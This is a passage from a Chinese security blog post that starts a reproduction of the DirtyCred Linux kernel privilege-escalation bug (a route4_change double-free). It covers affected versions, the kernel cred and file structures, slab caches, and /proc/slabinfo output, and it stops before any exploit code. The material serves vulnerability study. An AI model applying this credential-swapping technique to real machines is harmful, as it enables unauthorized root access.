<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="Dirty Cred 漏洞成因 DirtyCred，一种新的通用漏洞利用方法，不用依赖 Linux 的 pipeline 机制，只需利用堆内存破坏类型的漏洞  攻击适用版本：  Linux Kernel版本 &gt;&#x3D; 2.6.12  Linux Kernel版本 &lt;&#x3D; 5.19.1   在 Linux 内核的 net&#x2F;sched&#x2F;cls_route.c 实现的 route4_change">
<meta property="og:type" content="article">
<meta property="og:title" content="Kernel 现实漏洞复现：Dirty Cred">
<meta property="og:url" content="http://example.com/2022/12/28/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Cred/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:description" content="Dirty Cred 漏洞成因 DirtyCred，一种新的通用漏洞利用方法，不用依赖 Linux 的 pipeline 机制，只需利用堆内存破坏类型的漏洞  攻击适用版本：  Linux Kernel版本 &gt;&#x3D; 2.6.12  Linux Kernel版本 &lt;&#x3D; 5.19.1   在 Linux 内核的 net&#x2F;sched&#x2F;cls_route.c 实现的 route4_change">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-12-28T04:59:46.000Z">
<meta property="article:modified_time" content="2022-12-28T05:01:49.508Z">
<meta property="article:author" content="yhellow">
<meta property="article:tag" content="Kernel">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2022/12/28/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Cred/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>Kernel 现实漏洞复现：Dirty Cred | Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/28/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Cred/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Kernel 现实漏洞复现：Dirty Cred
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-12-28 12:59:46 / Modified: 13:01:49" itemprop="dateCreated datePublished" datetime="2022-12-28T12:59:46+08:00">2022-12-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>44k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>40 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><strong>Dirty Cred 漏洞成因</strong></p>
<p>DirtyCred，一种新的通用漏洞利用方法，不用依赖 Linux 的 pipeline 机制，只需利用堆内存破坏类型的漏洞 </p>
<p>攻击适用版本：</p>
<ul>
<li>Linux Kernel版本 &gt;= 2.6.12 </li>
<li>Linux Kernel版本 &lt;= 5.19.1 </li>
</ul>
<p>在 Linux 内核的 <code>net/sched/cls_route.c</code> 实现的 <code>route4_change</code> 中发现了一个漏洞，该漏洞源于释放后重用，本地攻击者利用该漏洞会导致系统崩溃，可能会造成本地特权升级问题 </p>
<p>由于将 <code>route4_filter</code> 对象从链表中删除和释放时的检查条件不一致，导致该对象被释放后仍存于链表中，后面可以触发 Double-Free</p>
<p><strong>前置知识 - 内核凭证 Credential</strong></p>
<p>Kernel 凭证是 kernel 文档中定义的 kernel 中携带特权信息的特征，表示权限和对应的能力，主要分为：</p>
<ul>
<li>task 凭证（<code>struct cred</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="keyword">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<ul>
<li>open file 凭证（<code>struct file</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>	<span class="title">fu_llist</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> 	<span class="title">fu_rcuhead</span>;</span></span><br><span class="line">	&#125; f_u;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>		<span class="title">f_path</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">f_inode</span>;</span>	<span class="comment">/* cached value */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>	*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Protects f_ep_links, f_flags.</span></span><br><span class="line"><span class="comment">	 * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">spinlock_t</span>		f_lock;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span>		<span class="title">f_write_hint</span>;</span></span><br><span class="line">	<span class="keyword">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> 		f_flags;</span><br><span class="line">	<span class="keyword">fmode_t</span>			f_mode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">f_pos_lock</span>;</span></span><br><span class="line">	<span class="keyword">loff_t</span>			f_pos;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>	<span class="title">f_owner</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">f_cred</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>	<span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="keyword">void</span>			*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">f_ep_links</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">f_tfile_llink</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">f_mapping</span>;</span></span><br><span class="line">	<span class="keyword">errseq_t</span>		f_wb_err;</span><br><span class="line">	<span class="keyword">errseq_t</span>		f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_handle</span> &#123;</span></span><br><span class="line">	__u32 handle_bytes;</span><br><span class="line">	<span class="keyword">int</span> handle_type;</span><br><span class="line">	<span class="comment">/* file identifier */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> f_handle[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>前置知识 - Slab 的两种内存缓存</strong></p>
<p>众所周知，Linux 内核主要使用 slab 分配器来进行内存分配，slab 分配器中主要维护了两种内存缓存（即可以理解成两套作用不同的内存分配方式）：</p>
<ul>
<li><code>dedicated cache</code>：这里的内存是用于分配给内核中的常用对象，在该缓存中被分配的结构体将始终保持初始化状态，以便于提高分配速度</li>
<li><code>generic cache</code>：通用缓存，大多数情况下其内存块的大小与 2 的幂次方对齐</li>
</ul>
<p>这类 <code>cred</code> 和 <code>file</code> 结构体等 <code>credential</code> 对象都是在 <code>dedicated cache</code> 中分配，而大多数内存漏洞发生的地方都是在 <code>generic cache</code> 中</p>
<p>使用 <code>sudo cat /proc/slabinfo</code> 可以查看 slab 分配器的具体信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">slabinfo - version: <span class="number">2.1</span></span><br><span class="line"><span class="meta"># name            <span class="meta-string">&lt;active_objs&gt;</span> <span class="meta-string">&lt;num_objs&gt;</span> <span class="meta-string">&lt;objsize&gt;</span> <span class="meta-string">&lt;objperslab&gt;</span> <span class="meta-string">&lt;pagesperslab&gt;</span></span></span><br><span class="line">isofs_inode_cache     <span class="number">94</span>     <span class="number">94</span>    <span class="number">688</span>   <span class="number">47</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">nf_conntrack         <span class="number">400</span>    <span class="number">400</span>    <span class="number">320</span>   <span class="number">25</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">au_vdir                <span class="number">0</span>      <span class="number">0</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">au_finfo               <span class="number">0</span>      <span class="number">0</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">au_icntnr              <span class="number">0</span>      <span class="number">0</span>    <span class="number">832</span>   <span class="number">39</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">au_dinfo               <span class="number">0</span>      <span class="number">0</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ovl_inode             <span class="number">90</span>     <span class="number">90</span>    <span class="number">720</span>   <span class="number">45</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">AF_VSOCK             <span class="number">375</span>    <span class="number">375</span>   <span class="number">1280</span>   <span class="number">25</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ext4_groupinfo_4k    <span class="number">672</span>    <span class="number">672</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">fsverity_info          <span class="number">0</span>      <span class="number">0</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">fscrypt_info           <span class="number">0</span>      <span class="number">0</span>    <span class="number">136</span>   <span class="number">30</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">MPTCPv6                <span class="number">0</span>      <span class="number">0</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">ip6-frags              <span class="number">0</span>      <span class="number">0</span>    <span class="number">184</span>   <span class="number">44</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">PINGv6                 <span class="number">0</span>      <span class="number">0</span>   <span class="number">1216</span>   <span class="number">26</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">RAWv6               <span class="number">1352</span>   <span class="number">1352</span>   <span class="number">1216</span>   <span class="number">26</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">UDPv6                <span class="number">360</span>    <span class="number">360</span>   <span class="number">1344</span>   <span class="number">24</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">tw_sock_TCPv6          <span class="number">0</span>      <span class="number">0</span>    <span class="number">248</span>   <span class="number">33</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">request_sock_TCPv6      <span class="number">0</span>      <span class="number">0</span>    <span class="number">304</span>   <span class="number">26</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : s0</span><br><span class="line">TCPv6                <span class="number">130</span>    <span class="number">130</span>   <span class="number">2432</span>   <span class="number">13</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kcopyd_job             <span class="number">0</span>      <span class="number">0</span>   <span class="number">3240</span>   <span class="number">10</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">dm_uevent              <span class="number">0</span>      <span class="number">0</span>   <span class="number">2888</span>   <span class="number">11</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">scsi_sense_cache    <span class="number">1504</span>   <span class="number">1504</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">mqueue_inode_cache     <span class="number">34</span>     <span class="number">34</span>    <span class="number">960</span>   <span class="number">34</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : s0</span><br><span class="line">fuse_request         <span class="number">338</span>    <span class="number">338</span>    <span class="number">152</span>   <span class="number">26</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">fuse_inode           <span class="number">195</span>    <span class="number">195</span>    <span class="number">832</span>   <span class="number">39</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span 